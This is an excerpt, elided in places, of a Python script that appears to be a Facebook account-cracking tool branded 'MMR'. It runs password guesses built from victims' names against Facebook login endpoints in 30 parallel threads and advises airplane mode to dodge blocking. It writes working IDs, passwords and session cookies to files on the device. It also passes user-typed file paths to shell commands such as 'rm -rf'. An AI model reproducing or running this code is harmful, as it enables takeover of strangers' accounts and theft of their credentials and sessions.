...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Mohammad Mehedi 
\033[1;37m Facebook:            Mohammad Mehedi 
\033[1;37m Github  :            Mohammad -Mehedi 
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back MMR Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://wa.me/qr/WZPZ2HGIIOHTM1')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/mohammad.mehedi.3191?mibextid=ZbWKwL/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {R}[MMR] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {R}{'{:.0%}'.format(loop/float(len(self.id)))}{R}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37e﻿ca387482a8a5b740f84f62',}
                q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [MMR-OK] {sid} | {ps} {R}")
                    oks.append(sid)
                    open('/sdcard/MMR_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MMR_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [MMR-CP] {sid} | {ps} {R}")
                     cps.append(sid)
                     open('/sdcard/MMR_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {R}[MMR] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {R}{'{:.0%}'.format(loop/float(len(self.id)))}{R}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [MMR-OK] {sid} | {ps} {R}")
                    oks.append(sid)
                    open('/sdcard/MMR_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/MMR_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [MMR-CP] {sid} | {ps} {R}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {R}[MMR] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {R}{'{:.0%}'.format(loop/float(len(self.id)))}{R}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {R}[MMR] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{R}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flo﻿w=login_no_pin&refsrc=deprecated&_rdr')
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MMR-OK] {sid} | {ps} {R}")
                    oks.append(sid)
                    open('/sdcard/MMR_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            if sl =='':
                ...
                for sr in range(sl):
                    pw.append(input(f'Password {Runa}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{A}Use flight (airplane) mode before use {R}")
            print(47*"-")
            print(f'{S} Total IDs : %s ' % len(self.id))
            print(f'{S} Cracking Started...')
            print(47*"-")
            with mehedimmr(max_workers=30) as mmrworld:
                for zmr in self.id:
                   try:
                       uid, name = zmr.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                mmrworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                mmrworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                mmrworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                mmrworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
...
def follower():
    ...
    try:
        ...
        try:
            ...
            menu()
        print(f'File Name To Dump Ids. Example /sdcard/MMR.txt') 
        print(47*"-")
        filepath = input("Put File Name: ")
        os.system('rm -rf %s'%(filepath))
     ﻿   clear()
...
def cutter():
    ...
    os.system('touch ' +mehedi)
    os.system('sort -r '+ssb+' | uniq > '+mehedi)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + mmr )
    print(47*'-')
    print("File Saved To :" + mehedi )
    print(47*'-')
    input(f"{R} Press Enter To Back MMR Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/MMR.txt\n') 
        filepath = input("Put File Name: ")
